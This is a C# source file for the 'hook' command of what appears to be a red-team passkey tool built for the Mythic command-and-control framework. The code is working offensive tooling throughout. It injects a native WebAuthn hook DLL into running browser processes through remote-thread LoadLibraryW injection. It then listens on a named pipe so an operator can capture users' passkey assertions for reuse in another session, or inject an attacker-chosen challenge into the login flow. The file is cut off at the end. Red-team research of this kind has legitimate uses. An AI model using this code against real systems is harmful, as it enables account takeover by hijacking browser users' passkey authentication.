using System.Buffers.Text;
using System.CommandLine;
using System.Diagnostics;
using System.Diagnostics.CodeAnalysis;
using System.Globalization;
using System.IO.Pipes;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Text.Json;
using Microsoft.Extensions.Logging;
using Microsoft.Win32.SafeHandles;
using Windows.Win32;
using Windows.Win32.Foundation;
using Windows.Win32.System.SystemInformation;
using Windows.Win32.System.Threading;

namespace SpecterOps.Passkeys.Mythic;

/// <summary>
/// Defines the <c>hook</c> subcommand tree for loading and unloading the native WebAuthn hook DLL
/// into running browser processes.
/// </summary>
internal static class HookCommand
{
    /// <summary>Module file name of the Windows WebAuthn client library whose exports the hook detours.</summary>
    private const string WebAuthnModuleName = "webauthn.dll";

    /// <summary>Common file-name prefix of the architecture-specific hook DLLs (e.g., <c>WebAuthnHook_x64.dll</c>).</summary>
    private const string HookModulePrefix = "WebAuthnHook_";

    /// <summary>Default local named pipe that the hook DLL writes assertion responses to.</summary>
    private const string DefaultHookPipeName = "WebAuthnHook";

    /// <summary>Prefix used when displaying or accepting a fully qualified local named pipe path.</summary>
    private const string LocalNamedPipePrefix = @"\\.\pipe\";

    /// <summary>Named pipe input buffer size for hook-to-server messages.</summary>
    private const int HookPipeInputBufferSize = 10 * 1024;

    /// <summary>Named pipe output buffer size for server-to-hook action messages.</summary>
    private const int HookPipeOutputBufferSize = 5 * 1024;

    /// <summary>Default timeout for <c>hook wait --challenge</c>.</summary>
    private static readonly TimeSpan DefaultChallengeWaitTimeout = TimeSpan.FromMinutes(10);

    /// <summary>Maximum number of remote <c>FreeLibrary</c> calls issued to decrement the hook's load count.</summary>
    private const int MaxUnloadAttempts = 8;

    /// <summary>Name of the <c>LoadLibraryW</c> export used for remote DLL injection.</summary>
    private const string LoadLibraryWExport = "LoadLibraryW";

    /// <summary>Name of the <c>FreeLibrary</c> export used for remote DLL unloading.</summary>
    private const string FreeLibraryExport = "FreeLibrary";

    /// <summary>
    /// Process names that can trigger Windows WebAuthn and are therefore candidates for injection.
    /// </summary>
    private static readonly string[] BrowserProcessNames =
    {
        "msedge",  // Microsoft Edge
        "chrome",  // Google Chrome
        "firefox", // Mozilla Firefox
        "brave",   // Brave
        "opera",   // Opera
        "vivaldi"  // Vivaldi
    };

    /// <summary>
    /// Captured information about a single browser process.
    /// </summary>
    private sealed class BrowserProcessInfo(int pid, string name, bool hasMainWindow, bool hasWebAuthn, bool hasHook)
    {
        public int Pid { get; init; } = pid;
        public string Name { get; init; } = name;
        public bool HasMainWindow { get; init; } = hasMainWindow;
        public bool HasWebAuthn { get; init; } = hasWebAuthn;
        public bool HasHook { get; init; } = hasHook;

        public static BrowserProcessInfo Create(Process process) => new(
            process.Id,
            process.ProcessName,
            HasMainWindow(process),
            HasModuleLoaded(process, WebAuthnModuleName),
            TryGetHookModule(process, out _)
        );
    }

    /// <summary>
    /// Creates the <c>hook</c> command with <c>attach</c>, <c>detach</c>, and <c>list</c> subcommands.
    /// </summary>
    public static Command Create(ILogger logger)
    {
        var attachPidOption = new Option<int?>("--pid", "-p")
        {
            Description = "Specific process ID to inject into."
        };
        var attachNameOption = new Option<string?>("--process-name", "--name", "-n")
        {
            Description = "Browser process name to target (e.g., msedge, chrome). Defaults to all known browsers."
        };
        var attachDllOption = new Option<string?>("--dll")
        {
            Description = "Explicit path to the hook DLL. When omitted, the architecture-matching WebAuthnHook_*.dll next to the CLI is used."
        };
        var attachCommand = new Command("attach", "Load the native WebAuthn hook DLL into a running browser process.")
        {
            attachPidOption,
            attachNameOption,
            attachDllOption
        };
        attachCommand.SetAction(parseResult => Attach(
            parseResult.GetValue(attachPidOption),
            parseResult.GetValue(attachNameOption),
            parseResult.GetValue(attachDllOption),
            logger));

        var detachPidOption = new Option<int?>("--pid", "-p")
        {
            Description = "Specific process ID to unload the hook from."
        };
        var detachNameOption = new Option<string?>("--process-name", "--name", "-n")
        {
            Description = "Browser process name to target. Defaults to all known browsers."
        };
        var detachCommand = new Command("detach", "Unload the native WebAuthn hook DLL from a running browser process.")
        {
            detachPidOption,
            detachNameOption
        };
        detachCommand.SetAction(parseResult => Detach(
            parseResult.GetValue(detachPidOption),
            parseResult.GetValue(detachNameOption),
            logger));

        var listCommand = new Command("list", "List running browser processes and the state of the native WebAuthn hook.");
        listCommand.SetAction(_ => ListBrowsers(logger));

        var waitRpIdOption = new Option<string?>("--rpid", "--relying-party", "-r")
        {
            Description = "Relying party ID to match before sending wait/capture/inject actions."
        };
        var waitChallengeOption = new Option<string?>("--challenge", "-c")
        {
            Description = "Base64url-encoded challenge to inject when the relying party ID matches."
        };
        var waitCrossSessionOption = new Option<bool>("--cross-session", "--capture")
        {
            Description = "Capture a matching assertion for cross-session use instead of letting the browser receive it."
        };
        var waitMonitorOption = new Option<bool>("--monitor", "-m")
        {
            Description = "Monitor hook messages without intervening; assertion starts receive continue."
        };
        var waitNamedPipeOption = new Option<string?>("--named-pipe", "--pipe", "-p")
        {
            Description = $"Named pipe name or local \\\\.\\pipe\\ path to listen on. Defaults to {DefaultHookPipeName}."
        };
        var waitCommand = new Command("wait", "Create the hook named pipe and listen for assertion responses from the hook DLL.")
        {
            waitRpIdOption,
            waitChallengeOption,
            waitCrossSessionOption,
            waitMonitorOption,
            waitNamedPipeOption
        };
        waitCommand.SetAction((parseResult, cancellationToken) =>
        {
            string? rpId = parseResult.GetValue(waitRpIdOption);
            string? challenge = parseResult.GetValue(waitChallengeOption);
            bool crossSession = parseResult.GetValue(waitCrossSessionOption);
            bool monitor = parseResult.GetValue(waitMonitorOption);
            string? namedPipe = parseResult.GetValue(waitNamedPipeOption);
            string pipeName = NormalizeLocalPipeName(namedPipe ?? DefaultHookPipeName);

            if (string.IsNullOrWhiteSpace(pipeName))
            {
                logger.LogError("The --named-pipe value must not be empty.");
                return Task.FromResult(1);
            }

            if (monitor && (!string.IsNullOrWhiteSpace(rpId) || !string.IsNullOrWhiteSpace(challenge) || crossSession))
            {
                logger.LogError("Specify --monitor by itself, optionally with --named-pipe.");
                return Task.FromResult(1);
            }

            if (string.IsNullOrWhiteSpace(rpId) && (!string.IsNullOrWhiteSpace(challenge) || crossSession))
            {
                logger.LogError("Specify --rpid when using --challenge or --cross-session.");
                return Task.FromResult(1);
            }

            if (!string.IsNullOrWhiteSpace(challenge) && crossSession)
            {
                logger.LogError("Specify either --challenge or --cross-session, not both.");
                return Task.FromResult(1);
            }

            if (!string.IsNullOrWhiteSpace(challenge) && !Base64Url.IsValid(challenge))
            {
                logger.LogError("The --challenge value must be a base64url token.");
                return Task.FromResult(1);
            }

            return WaitForHookResponsesAsync(logger, rpId, challenge, crossSession, monitor, pipeName, cancellationToken);
        });

        return new Command("hook", "Manage the native WebAuthn hook DLL in browser processes.")
        {
            attachCommand,
            detachCommand,
            listCommand,
            waitCommand
        };
    }

    /// <summary>
    /// Creates the requested hook named pipe and processes one hook message per connection
    /// until a matching completed assertion, matching assertion error, or the configured timeout is received.
    /// </summary>
    /// <returns>0 if the requested hook action completed; 1 on timeout, cancellation, or matching assertion error.</returns>
    private static async Task<int> WaitForHookResponsesAsync(
        ILogger logger,
        string? rpId,
        string? challenge,
        bool crossSession,
        bool monitor,
        string pipeName,
        CancellationToken cancellationToken)
    {
        PipeSecurity security = CreateAuthenticatedUsersPipeSecurity();
        TimeSpan? timeout = !string.IsNullOrWhiteSpace(challenge)
            ? DefaultChallengeWaitTimeout
            : null;

        logger.LogInformation(
            "Listening on \\\\.\\pipe\\{Name} for hook assertion responses (timeout: {Timeout})...",
            pipeName,
            timeout.HasValue ? $"{timeout.Value.TotalSeconds:0}s" : "none");

        DateTime? deadline = timeout.HasValue
            ? DateTime.UtcNow + timeout.Value
            : null;

        int? returnValue = null;

        while (!returnValue.HasValue)
        {
            TimeSpan? remaining = deadline.HasValue
                ? deadline.Value - DateTime.UtcNow
                : null;
            if (remaining <= TimeSpan.Zero)
            {
                break;
            }

            bool pipeCreated = false;
            string pipeOperation = "creating named pipe";
            try
            {
                using NamedPipeServerStream pipe = CreateHookPipeServer(pipeName, security);
                pipeCreated = true;
                using var cts = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
                if (remaining.HasValue)
                {
                    cts.CancelAfter(remaining.Value);
                }

                pipeOperation = "waiting for connection";
                await pipe.WaitForConnectionAsync(cts.Token);

                pipeOperation = "processing message";
                returnValue = await ProcessPipeMessageAsync(
                    pipe,
                    logger,
                    rpId,
                    challenge,
                    crossSession,
                    monitor,
                    cts.Token);
            }
            catch (OperationCanceledException)
            {
                break;
            }
            catch (IOException ex)
            {
                if (!pipeCreated)
                {
                    logger.LogError("Failed to create named pipe \\\\.\\pipe\\{Name}: {Message}", pipeName, ex.Message);
                    return 1;
                }

                logger.LogError("Pipe error while {Operation}: {Message}", pipeOperation, ex.Message);
            }
        }

        if (!returnValue.HasValue)
        {
            if (cancellationToken.IsCancellationRequested)
            {
                logger.LogInformation("Stopped listening after cancellation.");
                return 1;
            }

            logger.LogWarning("Timeout expired before a matching hook response was received.");
            return 1;
        }

        // Pass-through the return value
        return returnValue.Value;
    }

    /// <summary>
    /// Reads and dispatches one hook message.
    /// Returns how the wait loop should proceed after handling the message.
    /// </summary>
    private static async Task<int?> ProcessPipeMessageAsync(
        NamedPipeServerStream pipe,
        ILogger logger,
        string? rpId,
        string? challenge,
        bool crossSession,
        bool monitor,
        CancellationToken cancellationToken)
    {
        HookPipeMessage? message = await ReadPipeMessageAsync(pipe, logger, cancellationToken);
        if (message is null)
        {
            return null;
        }

        switch (message)
        {
            case AssertionStartedMessage startedMsg:
                logger.LogInformation(
                    "Assertion ceremony started: rpId={RpId} previousAction={PreviousAction} process={Process} (pid {Pid}) user={User} at {Timestamp}.",
                    startedMsg.RpId ?? "(null)",
                    startedMsg.PreviousAction?.ToString() ?? "(none)",
                    startedMsg.ProcessName ?? "(null)",
                    startedMsg.Pid,
                    startedMsg.UserName ?? "(null)",
                    startedMsg.Timestamp.ToLocalTime());

                HookActionMessage actionMessage = BuildHookActionMessage(rpId, challenge, crossSession, monitor, startedMsg);
                await WritePipeActionMessageAsync(pipe, actionMessage, logger, cancellationToken);

                if (actionMessage.Action == HookAction.Wait)
                {
                    // Exit the CLI app
                    logger.LogInformation("The authentication flow has been paused for 60s. Re-run the command with the --challenge parameter.");
                    return 0;
                }

                break;
            case AssertionCompletedMessage completedMsg:
                logger.LogInformation(
                    "Assertion ceremony completed: rpId={RpId} previousAction={PreviousAction} process={Process} (pid {Pid}) user={User} at {Timestamp}.",
                    completedMsg.RpId ?? "(null)",
                    completedMsg.PreviousAction?.ToString() ?? "(none)",
                    completedMsg.ProcessName ?? "(null)",
                    completedMsg.Pid,
                    completedMsg.UserName ?? "(null)",
                    completedMsg.Timestamp.ToLocalTime());
                Console.WriteLine(completedMsg.Payload.GetRawText());

                if (RpIdsMatch(rpId, message.RpId))
                {
                    // Exit the CLI app
                    logger.LogInformation("Stopping the listener after the requested hook flow completed.");
                    return 0;
                }

                break;
            case AssertionErrorMessage errorMsg:
                logger.LogWarning(
                    "Hook reported assertion error {HResultMessage} for rpId={RpId} previousAction={PreviousAction} user={User} at {Timestamp}.",
                    Marshal.GetExceptionForHR(unchecked((int)errorMsg.HResult))?.Message
                        ?? $"HRESULT 0x{errorMsg.HResult:X8}",
                    errorMsg.RpId ?? "(null)",
                    errorMsg.PreviousAction?.ToString() ?? "(none)",
                    errorMsg.UserName ?? "(null)",
                    errorMsg.Timestamp.ToLocalTime());

                if (RpIdsMatch(rpId, message.RpId))
                {
                    // Exit the CLI app
                    logger.LogInformation("Stopping the listener after receiving a matching hook error.");
                    return 1;
                }

                break;
            default:
                logger.LogWarning("Unrecognized pipe message type: {Type}; ignoring.", message?.GetType().Name);
                break;
        }

        // Continue by default
        return null;
    }

    private static HookActionMessage BuildHookActionMessage(
        string? rpId,
        string? challenge,
        bool crossSession,
        bool monitor,
        AssertionStartedMessage startedMsg)
    {
        if (monitor)
        {
            // Never interrupt the authentication process in monitor mode
            return new HookActionMessage { Action = HookAction.Continue };
        }

        if (!string.IsNullOrWhiteSpace(rpId) && !RpIdsMatch(rpId, startedMsg.RpId))
        {
            // RP ID does not match, so just continue
            return new HookActionMessage { Action = HookAction.Continue };
        }

        if (crossSession)
        {
            // Capture the assertion with the original challenge
            return new HookActionMessage { Action = HookAction.Capture };
        }

        if (!string.IsNullOrWhiteSpace(challenge))
        {
            // Inject the operator-provided challenge to the flow
            return new HookActionMessage { Action = HookAction.Inject, Challenge = challenge };
        }

        // Wait for a challenge to be provided by the operator.
        return new HookActionMessage { Action = HookAction.Wait };
    }

    private static async Task WritePipeActionMessageAsync(
        NamedPipeServerStream pipe,
        HookActionMessage actionMessage,
        ILogger logger,
        CancellationToken cancellationToken)
    {
        logger.LogInformation("Sending hook action {Action} to pipe client.", actionMessage.Action);
        byte[] message = JsonSerializer.SerializeToUtf8Bytes(actionMessage, HookPipeMessageJsonContext.Default.HookActionMessage);
        await pipe.WriteAsync(message, 0, message.Length, cancellationToken);
        await pipe.FlushAsync(cancellationToken);
    }

    private static bool RpIdsMatch(string? expected, string? actual)
        => !string.IsNullOrWhiteSpace(expected)
            && !string.IsNullOrWhiteSpace(actual)
            && string.Equals(expected, actual, StringComparison.OrdinalIgnoreCase);

    /// <summary>
    /// Reads one complete pipe message from <paramref name="pipe"/> operating in
    /// <see cref="PipeTransmissionMode.Message"/> mode. Accumulates chunks until
    /// <see cref="PipeStream.IsMessageComplete"/> is <c>true</c>.
    /// </summary>
    /// <returns>The decoded hook pipe message, or <c>null</c> when the pipe is closed or sends invalid JSON.</returns>
    private static async Task<HookPipeMessage?> ReadPipeMessageAsync(
        NamedPipeServerStream pipe,
        ILogger logger,
        CancellationToken cancellationToken)
    {
        MemoryStream accumulated = new();
        byte[] chunk = new byte[HookPipeInputBufferSize];

        do
        {
            int read = await pipe.ReadAsync(chunk, 0, chunk.Length, cancellationToken);
            if (read == 0)
            {
                logger.LogWarning("Pipe connection closed without receiving any message.");
                return null;
            }

            accumulated.Write(chunk, 0, read);
        }
        while (!pipe.IsMessageComplete);

        string messageJson = Encoding.UTF8.GetString(accumulated.ToArray());
        try
        {
            HookPipeMessage? message = JsonSerializer.Deserialize(
                messageJson,
                HookPipeMessageJsonContext.Default.HookPipeMessage);
            if (message is null)
            {
                logger.LogWarning("Hook pipe message did not contain a message object.");
            }

            return message;
        }
        catch (JsonException ex)
        {
            logger.LogWarning("Failed to parse hook pipe message: {Error}", ex.Message);
            return null;
        }
    }

    /// <summary>
    /// Builds a <see cref="PipeSecurity"/> descriptor that grants the built-in
    /// <em>Authenticated Users</em> group write access so that the hook DLL,
    /// running under any interactively logged-in account, can connect and deliver responses.
    /// </summary>
    private static PipeSecurity CreateAuthenticatedUsersPipeSecurity()
    {
        var security = new PipeSecurity();
        security.AddAccessRule(new PipeAccessRule(
            new SecurityIdentifier(WellKnownSidType.NetworkSid, null),
            PipeAccessRights.FullControl,
            AccessControlType.Deny));
        security.AddAccessRule(new PipeAccessRule(
            new SecurityIdentifier(WellKnownSidType.AuthenticatedUserSid, null),
            PipeAccessRights.ReadWrite,
            AccessControlType.Allow));
        return security;
    }

    /// <summary>
    /// Resolves target browser processes and injects the architecture-matching hook DLL via <c>CreateRemoteThread</c> + <c>LoadLibraryW</c>.
    /// </summary>
    /// <returns>0 if every targeted process was injected (or already hooked); 1 on any failure.</returns>
    private static int Attach(int? pid, string? processName, string? dllPath, ILogger logger)
    {
        var targets = ResolveTargets(logger, pid, processName is not null ? [processName] : null, filterWebAuthn: true);
        if (targets.Count == 0)
        {
            return 1;
        }

        int failures = 0;
        foreach (var process in targets)
        {
            var resolvedDll = ResolveHookDllPath(process.Pid, dllPath, logger);
            if (resolvedDll is null)
            {
                failures++;
                continue;
            }

            if (!InjectIntoProcess(process.Pid, resolvedDll, logger))
            {
                failures++;
            }
        }

        return failures == 0 ? 0 : 1;
    }

    /// <summary>
    /// Resolves target browser processes and unloads the hook DLL via remote <c>FreeLibrary</c> calls.
    /// </summary>
    /// <returns>0 if every targeted process was unloaded (or was not hooked); 1 on any failure.</returns>
    private static int Detach(int? pid, string? processName, ILogger logger)
    {
        var targets = ResolveTargets(logger, pid, processName is not null ? [processName] : null, filterWebAuthn: false);
        if (targets.Count == 0)
        {
            return 1;
        }

        int failures = 0;
        foreach (var process in targets)
        {
            if (!UnloadFromProcess(process.Pid, logger))
            {
                failures++;
            }
        }

        return failures == 0 ? 0 : 1;
    }

    /// <summary>
    /// Enumerates known browser processes and prints a table showing whether <c>webauthn.dll</c> and the hook DLL are loaded.
    /// Per browser, narrows the list to the most interesting instances: processes that own a visible window,
    /// else processes that have already loaded <c>webauthn.dll</c>, else every instance.
    /// </summary>
    private static int ListBrowsers(ILogger logger)
    {
        logger.LogInformation("Enumerating browser processes...");
        var rows = ResolveTargets(logger, processNames: BrowserProcessNames, filterWebAuthn: true);

        if (rows.Count == 0)
        {
            // ResolveTargets has already logged the reason for zero results (e.g., no matching processes, or invalid arguments), so just return.
            return 0;
        }

        rows.Sort((left, right) =>
        {
            int byName = string.Compare(left.Name, right.Name, StringComparison.OrdinalIgnoreCase);
            return byName != 0 ? byName : left.Pid.CompareTo(right.Pid);
        });

        var table = new AsciiTable("PID", "Name", "Has Window", "WebAuthn Loaded", "Hook Loaded");
        foreach (BrowserProcessInfo row in rows)
        {
            table.AddRow(
                row.Pid.ToString(CultureInfo.InvariantCulture),
                row.Name,
                row.HasMainWindow ? "Yes" : "No",
                row.HasWebAuthn ? "Yes" : "No",
                row.HasHook ? "Yes" : "No");
        }

        table.Print(Console.Out);
        logger.LogInformation("Total browser processes found: {Count}", rows.Count);
        return 0;
    }

    /// <summary>
    /// Expands the user's <c>--pid</c> / <c>--process-name</c> selection into a list of live <see cref="Process"/> handles.
    /// </summary>
    /// <returns>An empty list when no matching process is found; callers are responsible for disposing each returned process.</returns>
    private static List<BrowserProcessInfo> ResolveTargets(ILogger logger, int? pid = null, string[]? processNames = null, bool filterWebAuthn = true)
    {
        if (pid.HasValue)
        {
            if (processNames is not null)
            {
                logger.LogError("Specify either --pid or --process-name, not both.");
                return [];
            }

            try
            {
                using var process = Process.GetProcessById(pid.Value);
                return [BrowserProcessInfo.Create(process)];
            }
            catch (ArgumentException)
            {
                logger.LogError("A process with pid {Pid} was not found.", pid.Value);
                return [];
            }
        }
        else
        {
            processNames ??= BrowserProcessNames;

            // Process.GetProcessesByName expects names without the .exe suffix, so strip it if present.
            IEnumerable<string> candidateNames = processNames.Select(name => NormalizeProcessName(name));
            List<BrowserProcessInfo> results = [];

            foreach (string name in candidateNames)
            {
                // Modern browsers spawn many helper/renderer/GPU children under the same image name.
                // Listing every one clutters the output, so per-browser we pick the most useful slice:
                //   1. Any process that owns a visible top-level window (the "main" UX process).
                //   2. Else any process that has already loaded webauthn.dll (seen a passkey operation).
                //   3. Else every instance, so at least something is reported.
                Process[] processes = Process.GetProcessesByName(name);
                try
                {
                    // Snapshot the window / webauthn / hook state for each process in one pass so the
                    // selection logic below can reference the same values without re-querying.
                    IEnumerable<BrowserProcessInfo> candidates = processes.Select(process => BrowserProcessInfo.Create(process));

                    // Narrow to the first tier that has any hits; fall through to "show everything" only
                    // when both window-owning and webauthn-loaded subsets are empty.
                    if (candidates.Any(c => c.HasMainWindow))
                    {
                        results.AddRange(candidates.Where(c => c.HasMainWindow));
                    }
                    else if (candidates.Any(c => c.HasWebAuthn) && filterWebAuthn)
                    {
                        results.AddRange(candidates.Where(c => c.HasWebAuthn));
                    }
                    else
                    {
                        results.AddRange(candidates);
                    }
                }
                finally
                {
                    // Dispose every Process — both the ones we rendered and the ones filtered out.
                    foreach (Process process in processes)
                    {
                        process.Dispose();
                    }
                }
            }

            if (results.Count == 0)
            {
                logger.LogWarning("No matching browser processes were found.");
            }

            return results;
        }
    }

    /// <summary>
    /// Writes the hook DLL path into the target's address space and calls <c>LoadLibraryW</c> on it via a remote thread.
    /// </summary>
    /// <returns><c>true</c> when the hook is loaded (or was already loaded); <c>false</c> if any Win32 call failed.</returns>
    private static unsafe bool InjectIntoProcess(int pid, string dllPath, ILogger logger)
    {
        try
        {
            using var process = Process.GetProcessById(pid);
            string processName = process.ProcessName;

            if (TryGetHookModule(process, out _))
            {
                logger.LogInformation("Skipping {Name} (pid {Pid}): hook is already loaded.", processName, pid);
                return true;
            }

            using var processHandle = SafeProcessHandle.OpenProcess(
                PROCESS_ACCESS_RIGHTS.PROCESS_CREATE_THREAD
                | PROCESS_ACCESS_RIGHTS.PROCESS_QUERY_INFORMATION
                | PROCESS_ACCESS_RIGHTS.PROCESS_VM_OPERATION
                | PROCESS_ACCESS_RIGHTS.PROCESS_VM_WRITE
                | PROCESS_ACCESS_RIGHTS.PROCESS_VM_READ,
                false,
                pid);

            if (processHandle.IsInvalid)
            {
                PInvokeErrorLogger.LogLastPInvokeError(logger, nameof(PInvoke.OpenProcess), pid);
                return false;
            }

            var dllPathBytes = Encoding.Unicode.GetBytes(dllPath + '\0');
            using var remoteBuffer = RemoteAllocationSafeHandle.Allocate(processHandle, (nuint)dllPathBytes.Length);
            if (remoteBuffer.IsInvalid)
            {
                PInvokeErrorLogger.LogLastPInvokeError(logger, nameof(PInvoke.VirtualAllocEx), pid);
                return false;
            }

            if (!processHandle.WriteProcessMemory(remoteBuffer, dllPathBytes))
            {
                PInvokeErrorLogger.LogLastPInvokeError(logger, nameof(PInvoke.WriteProcessMemory), pid);
                return false;
            }

            var loadLibraryAddress = GetKernel32ExportAddress(LoadLibraryWExport);
            if (loadLibraryAddress == IntPtr.Zero)
            {
                PInvokeErrorLogger.LogLastPInvokeError(logger, nameof(PInvoke.GetProcAddress), pid);
                return false;
            }

            if (!processHandle.TryRunRemoteThread(
                loadLibraryAddress,
                remoteBuffer,
                LoadLibraryWExport,
                pid,
                logger,
                out uint loadResult))
            {
                return false;
            }

            if (loadResult == 0)
            {
                logger.LogError("Remote LoadLibraryW returned null for pid {Pid}.", pid);
                return false;
            }

            logger.LogInformation("Injected {Dll} into {Name} (pid {Pid}).", Path.GetFileName(dllPath), processName, pid);
            return true;
        }
        catch (ArgumentException)
        {
            logger.LogWarning("Cannot inject into pid {Pid}: the process exited before it could be opened.", pid);
            return false;
        }
        catch (InvalidOperationException ex)
        {
            logger.LogWarning("Cannot inject into pid {Pid}: {Message}", pid, ex.Message);
            return false;
        }
    }

    /// <summary>
    /// Issues remote <c>FreeLibrary</c> calls against the hook module until its reference count drops to zero,
    /// giving up after <see cref="MaxUnloadAttempts"/> attempts.
    /// </summary>
    /// <returns><c>true</c> when the module is fully unloaded (or was not loaded); <c>false</c> if a call failed or the count never reached zero.</returns>
    private static unsafe bool UnloadFromProcess(int pid, ILogger logger)
    {
        try
        {
            using var process = Process.GetProcessById(pid);
            string processName = process.ProcessName;

            if (!TryGetHookModule(process, out var hookModule))
            {
                logger.LogInformation("Skipping {Name} (pid {Pid}): hook is not loaded.", processName, pid);
                return true;
            }

            using var processHandle = SafeProcessHandle.OpenProcess(
                PROCESS_ACCESS_RIGHTS.PROCESS_CREATE_THREAD
                | PROCESS_ACCESS_RIGHTS.PROCESS_QUERY_INFORMATION
                | PROCESS_ACCESS_RIGHTS.PROCESS_VM_OPERATION
                | PROCESS_ACCESS_RIGHTS.PROCESS_VM_READ,
                false,
                pid);

            if (processHandle.IsInvalid)
            {
                PInvokeErrorLogger.LogLastPInvokeError(logger, nameof(PInvoke.OpenProcess), pid);
                return false;
            }

            // Resolve FreeLibrary once rather than on every loop iteration.
            var freeLibraryAddress = GetKernel32ExportAddress(FreeLibraryExport);
            if (freeLibraryAddress == IntPtr.Zero)
            {
                PInvokeErrorLogger.LogLastPInvokeError(logger, nameof(PInvoke.GetProcAddress), pid);
                return false;
            }

            // Attach installs two detours (the assertion hook and optionally the LoadLibrary bootstraps),
            // so each FreeLibrary call only decrements one reference. Retry until the module is fully gone.
            for (int attempt = 0; attempt < MaxUnloadAttempts; attempt++)
            {
                processHandle.TryRunRemoteThread(
                    freeLibraryAddress,
                    hookModule,
                    FreeLibraryExport,
                    pid,
                    logger,
                    out _);

                process.Refresh();
                if (!TryGetHookModule(process, out hookModule))
                {
                    logger.LogInformation("Unloaded hook from {Name} (pid {Pid}).", processName, pid);
                    return true;
                }
            }

            logger.LogError("Unable to fully unload the hook from {Name} (pid {Pid}).", processName, pid);
            return false;
        }
        catch (ArgumentException)
        {
            logger.LogWarning("Cannot unload hook from pid {Pid}: the process exited before it could be opened.", pid);
            return false;
        }
        catch (InvalidOperationException ex)
        {
            logger.LogWarning("Cannot unload hook from pid {Pid}: {Message}", pid, ex.Message);
            return false;
        }
    }

    /// <summary>
    /// Creates a new <see cref="NamedPipeServerStream"/> for the requested WebAuthn hook pipe.
    /// </summary>
    private static NamedPipeServerStream CreateHookPipeServer(string pipeName, PipeSecurity security)
        => new(
            pipeName,
            PipeDirection.InOut,
            maxNumberOfServerInstances: NamedPipeServerStream.MaxAllowedServerInstances,
            PipeTransmissionMode.Message,
            PipeOptions.Asynchronous,
            inBufferSize: HookPipeInputBufferSize,
            outBufferSize: HookPipeOutputBufferSize,
            security);

    /// <summary>
    /// Accepts either a bare pipe name or a local <c>\\.\pipe\name</c> path and returns the bare name.
    /// </summary>
    private static string NormalizeLocalPipeName(string pipeName)
        => pipeName.StartsWith(LocalNamedPipePrefix, StringComparison.OrdinalIgnoreCase)
            ? pipeName[LocalNamedPipePrefix.Length..]
            : pipeName;

    /// <summary>
    /// Resolves the full path to the hook DLL matching the target process's architecture,
    /// using <paramref name="explicitPath"/> when provided, otherwise falling back to a co-located <c>WebAuthnHook_{arch}.dll</c>.
    /// </summary>
    /// <returns>The resolved DLL path, or <c>null</c> when no matching DLL can be located.</returns>
    private static string? ResolveHookDllPath(int pid, string? explicitPath, ILogger logger)
    {
        if (!string.IsNullOrWhiteSpace(explicitPath))
        {
            var fullPath = Path.GetFullPath(explicitPath!);
            if (File.Exists(fullPath))
            {
                return fullPath;
            }

            logger.LogError("Hook DLL not found at {Path}.", fullPath);
            return null;
        }

        var arch = DetectProcessArchitecture(pid, logger);
        var dllName = arch switch
        {
            Architecture.X64 => HookModulePrefix + "x64.dll",
            Architecture.X86 => HookModulePrefix + "x86.dll",
            Architecture.Arm64 => HookModulePrefix + "arm64.dll",
            _ => null
        };

        if (dllName is null)
        {
            logger.LogError("Unsupported or undetectable architecture for pid {Pid}.", pid);
            return null;
        }

        var baseDirectory = Path.GetDirectoryName(typeof(HookCommand).Assembly.Location) ?? string.Empty;
        var candidate = Path.Combine(baseDirectory, dllName);
        if (File.Exists(candidate))
        {
            return candidate;
        }

        logger.LogError("Hook DLL {Name} not found next to the CLI ({Directory}). Pass --dll explicitly.", dllName, baseDirectory);
        return null;
    }

    /// <summary>
    /// Uses <c>IsWow64Process2</c> to determine the effective architecture of <paramref name="process"/>,
    /// accounting for WoW64 (x86-on-x64) and WoW64-style x64-on-ARM64 emulation.
    /// </summary>
    /// <returns>The detected <see cref="Architecture"/>, or <c>null</c> if the value cannot be obtained or mapped.</returns>
    private static unsafe Architecture? DetectProcessArchitecture(int pid, ILogger logger)
    {
        using var handle = SafeProcessHandle.OpenProcess(PROCESS_ACCESS_RIGHTS.PROCESS_QUERY_LIMITED_INFORMATION, false, pid);
        if (handle.IsInvalid)
        {
            PInvokeErrorLogger.LogLastPInvokeError(logger, nameof(PInvoke.OpenProcess), pid);
            return null;
        }

        IMAGE_FILE_MACHINE processMachine;
        IMAGE_FILE_MACHINE nativeMachine;
        if (!handle.IsWow64Process(out processMachine, out nativeMachine))
        {
            PInvokeErrorLogger.LogLastPInvokeError(logger, nameof(PInvoke.IsWow64Process2), pid);
            return null;
        }

        // IMAGE_FILE_MACHINE_UNKNOWN in processMachine means the target is running natively,
        // so the process architecture equals the host's native architecture.
        var machine = processMachine == IMAGE_FILE_MACHINE.IMAGE_FILE_MACHINE_UNKNOWN
            ? nativeMachine
            : processMachine;

        return machine switch
        {
            IMAGE_FILE_MACHINE.IMAGE_FILE_MACHINE_I386 => Architecture.X86,
            IMAGE_FILE_MACHINE.IMAGE_FILE_MACHINE_AMD64 => Architecture.X64,
            IMAGE_FILE_MACHINE.IMAGE_FILE_MACHINE_ARM64 => Architecture.Arm64,
            _ => (Architecture?)null
        };
    }

    /// <summary>
    /// Returns the address of an exported function in <c>kernel32.dll</c> (already loaded at a fixed base
    /// in every Windows process), suitable as a remote thread start address.
    /// </summary>
    private static IntPtr GetKernel32ExportAddress(string exportName)
    {
        var kernel32 = PInvoke.GetModuleHandle("kernel32.dll");
        return (IntPtr)PInvoke.GetProcAddress(kernel32, exportName);
    }

    /// <summary>
    /// Returns <c>true</c> when <paramref name="process"/> owns a top-level window.
    /// Swallows <see cref="InvalidOperationException"/> if the process exits between enumeration and inspection.
    /// </summary>
    private static bool HasMainWindow(Process process)
    {
        try
        {
            return process.MainWindowHandle != IntPtr.Zero;
        }
        catch (InvalidOperationException)
        {
            return false;
        }
    }

    /// <summary>
    /// Checks whether <paramref name="process"/> currently has a module with the given file name loaded.
    /// Swallows access-denied and exited-process errors and reports them as "not loaded".
    /// </summary>
    private static bool HasModuleLoaded(Process process, string moduleName)
    {
        try
        {
            foreach (ProcessModule module in process.Modules)
            {
                if (string.Equals(module.ModuleName, moduleName, StringComparison.OrdinalIgnoreCase))
                {
                    return true;
                }
            }
        }
        catch
        {
            // Access denied or the process exited; treat as "not loaded" so callers fall back gracefully.
        }

        return false;
    }

    /// <summary>
    /// Locates any loaded module whose file name starts with <see cref="HookModulePrefix"/> (e.g., <c>WebAuthnHook_x64.dll</c>),
    /// so detach works regardless of which architecture variant was injected.
    /// </summary>
